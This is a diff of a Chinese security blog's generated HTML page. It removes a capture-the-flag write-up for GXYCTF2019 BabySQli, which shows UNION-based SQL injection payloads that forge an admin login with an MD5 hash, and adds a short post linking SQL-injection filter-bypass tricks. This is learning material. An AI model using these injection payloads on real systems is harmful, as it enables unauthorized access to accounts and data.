@@ -16,28 +16,23 @@
   <meta name="author" content="YY">
   <meta name="keywords" content="">
   
-    <meta name="description" content="[GXYCTF2019]BabySQli进入就是登录界面，  尝试之后，在源码页面发现提示，  先用base32解码，然后base64解码， 1select * from user where username &#x3D; &amp;#x27;$name&amp;#x27;  接下来尝试，发现过滤了or，&#x3D;，()，or可以使用Or绕过，&#x3D;可以用&lt;&gt;绕过，()倒是没想到什么好的办法，使用 1admin&amp;#x27">
+    <meta name="description" content="sql注入绕waf[SQL注入一些过滤及绕过总结_devil8123665的博客-CSDN博客_sql注入过滤](https:&#x2F;&#x2F;blog.csdn.net&#x2F;devil8123665&#x2F;article&#x2F;details&#x2F;108746947#:~:text&#x3D;SQL注入绕过技巧 1.绕过空格（注释符%2F* *%2F，%a0）：,2.括号绕过空格： 3.引号绕过（使用十六进制）： 4.逗号绕过（limit">
 <meta property="og:type" content="article">
-<meta property="og:title" content="[ctf-web] GXYCTF2019-BabySQLi">
-<meta property="og:url" content="https://s1n9l3.github.io/2022/12/11/[ctf-web]%20GXYCTF2019-BabySQLi/index.html">
+<meta property="og:title" content="[渗透测试] SQL注入绕waf">
+<meta property="og:url" content="https://s1n9l3.github.io/2022/12/13/[%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95]%20sql%E6%B3%A8%E5%85%A5%E7%BB%95waf/index.html">
 <meta property="og:site_name" content="S1n9l3">
-<meta property="og:description" content="[GXYCTF2019]BabySQli进入就是登录界面，  尝试之后，在源码页面发现提示，  先用base32解码，然后base64解码， 1select * from user where username &#x3D; &amp;#x27;$name&amp;#x27;  接下来尝试，发现过滤了or，&#x3D;，()，or可以使用Or绕过，&#x3D;可以用&lt;&gt;绕过，()倒是没想到什么好的办法，使用 1admin&amp;#x27">
+<meta property="og:description" content="sql注入绕waf[SQL注入一些过滤及绕过总结_devil8123665的博客-CSDN博客_sql注入过滤](https:&#x2F;&#x2F;blog.csdn.net&#x2F;devil8123665&#x2F;article&#x2F;details&#x2F;108746947#:~:text&#x3D;SQL注入绕过技巧 1.绕过空格（注释符%2F* *%2F，%a0）：,2.括号绕过空格： 3.引号绕过（使用十六进制）： 4.逗号绕过（limit">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221211214837774.png">
-<meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221211214910324.png">
-<meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/20163356-f177be36d62355a1.png">
-<meta property="article:published_time" content="2022-12-11T13:46:54.452Z">
-<meta property="article:modified_time" content="2022-12-11T13:56:05.304Z">
+<meta property="article:published_time" content="2022-12-13T11:41:57.300Z">
+<meta property="article:modified_time" content="2022-12-13T11:42:44.006Z">
 <meta property="article:author" content="YY">
+<meta property="article:tag" content="渗透测试">
 <meta property="article:tag" content="sql注入">
-<meta property="article:tag" content="ctf">
-<meta property="article:tag" content="ctf-web">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221211214837774.png">
   
   
   
-  <title>[ctf-web] GXYCTF2019-BabySQLi - S1n9l3</title>
+  <title>[渗透测试] SQL注入绕waf - S1n9l3</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -202,7 +197,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="[ctf-web] GXYCTF2019-BabySQLi"></span>
+            <span id="subtitle" data-typed-text="[渗透测试] SQL注入绕waf"></span>
           
         </div>
 
@@ -213,8 +208,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-12-11 21:46" pubdate>
-          2022年12月11日 晚上
+        <time datetime="2022-12-13 19:41" pubdate>
+          2022年12月13日 晚上
         </time>
       </span>
     
@@ -225,7 +220,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          562 字
+          234 字
         
       </span>
     
@@ -236,7 +231,7 @@
         
         
         
-          5 分钟
+          2 分钟
         
       </span>
     
@@ -274,32 +269,12 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">[ctf-web] GXYCTF2019-BabySQLi</h1>
+            <h1 style="display: none">[渗透测试] SQL注入绕waf</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p>进入就是登录界面，</p>
-<p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221211214837774.png" srcset="/img/loading.gif" lazyload alt="image-20221211214837774"></p>
-<p>尝试之后，在源码页面发现提示，</p>
-<p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221211214910324.png" srcset="/img/loading.gif" lazyload alt="image-20221211214910324"></p>
-<p>先用base32解码，然后base64解码，</p>
-<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;$name&#x27;</span><br></code></pre></td></tr></table></figure>
-
-<p>接下来尝试，发现过滤了<code>or</code>，<code>=</code>，<code>()</code>，<code>or</code>可以使用<code>Or</code>绕过，<code>=</code>可以用<code>&lt;&gt;</code>绕过，<code>()</code>倒是没想到什么好的办法，使用</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">admin</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure>
-
-<p>确定了有3列，之后就不会了。</p>
-<p>使用的是虚拟表（大概），使用这样的语句：</p>
-<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;admin&#x27;</span>,md5(<span class="hljs-string">&#x27;abc&#x27;</span>);<br></code></pre></td></tr></table></figure>
-
-<p>返回结果为：</p>
-<p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/20163356-f177be36d62355a1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>意味着联合查询会构造一个虚拟表，这个表中的数据并没有保存，只是临时存在的，所以如果构造这样的语句：</p>
-<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">xx&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-symbol">&#x27;admin</span><span class="hljs-string">&#x27;,&#x27;</span>c4ca4238a0b923820dcc509a6f75849b&#x27;#<br></code></pre></td></tr></table></figure>
-
-<p>这里<code>c4ca4238a0b923820dcc509a6f75849b</code>是<code>MD5(1)</code>的值，密码使用<code>1</code>，就可以登录成功了。</p>
-<p>[<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/6fd932f883cd">GXYCTF2019] BabySQli WriteUp - 简书 (jianshu.com)</a></p>
+                <h1 id="sql注入绕waf"><a href="#sql注入绕waf" class="headerlink" title="sql注入绕waf"></a>sql注入绕waf</h1><p>[SQL注入一些过滤及绕过总结_devil8123665的博客-CSDN博客_sql注入过滤](<a target="_blank" rel="noopener" href="https://blog.csdn.net/devil8123665/article/details/108746947#:~:text=SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7">https://blog.csdn.net/devil8123665/article/details/108746947#:~:text=SQL注入绕过技巧</a> 1.绕过空格（注释符%2F* *%2F，%a0）：,2.括号绕过空格： 3.引号绕过（使用十六进制）： 4.逗号绕过（limit使用from或者offset）（substr使用from for属于逗号）：)</p>
 
                 
               </div>
@@ -318,7 +293,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/sql%E6%B3%A8%E5%85%A5/" class="category-chain-item">sql注入</a>
+  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="category-chain-item">渗透测试</a>
   
   
 
@@ -328,7 +303,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
+  <a href="/categories/sql%E6%B3%A8%E5%85%A5/" class="category-chain-item">sql注入</a>
   
   
 
@@ -343,11 +318,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
+        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">#渗透测试</a>
+      
         <a href="/tags/sql%E6%B3%A8%E5%85%A5/">#sql注入</a>
-      
-        <a href="/tags/ctf/">#ctf</a>
-      
-        <a href="/tags/ctf-web/">#ctf-web</a>
       
     </div>
   
@@ -359,8 +332,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>[ctf-web] GXYCTF2019-BabySQLi</div>
-      <div>https://s1n9l3.github.io/2022/12/11/[ctf-web] GXYCTF2019-BabySQLi/</div>
+      <div>[渗透测试] SQL注入绕waf</div>
+      <div>https://s1n9l3.github.io/2022/12/13/[渗透测试] sql注入绕waf/</div>
     </div>
     <div class="license-meta">
       
@@ -372,7 +345,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年12月11日</div>
+          <div>2022年12月13日</div>
         </div>
       
       
@@ -404,9 +377,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/12/13/%5B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%5D%20sql%E6%B3%A8%E5%85%A5fuzz%E5%AD%97%E5%85%B8/" title="[渗透测试] SQL注入fuzz字典">
+                      <a href="/2022/12/13/%5B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%5D%20php%E5%85%8D%E6%9D%80/" title="[渗透测试] php免杀">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">[渗透测试] SQL注入fuzz字典</span>
+                        <span class="hidden-mobile">[渗透测试] php免杀</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -414,8 +387,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/12/08/%5Bctf-web%5D%20%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-AreUserialz/" title="[ctf-web] 网鼎杯2020青龙组-AreUSerialz">
-                        <span class="hidden-mobile">[ctf-web] 网鼎杯2020青龙组-AreUSerialz</span>
+                      <a href="/2022/12/13/%5Bctf-web%5D%20CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-HackWorld/" title="[ctf-web] CISCN2019-华北赛区-Day2-Web1-HackWorld">
+                        <span class="hidden-mobile">[ctf-web] CISCN2019-华北赛区-Day2-Web1-HackWorld</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
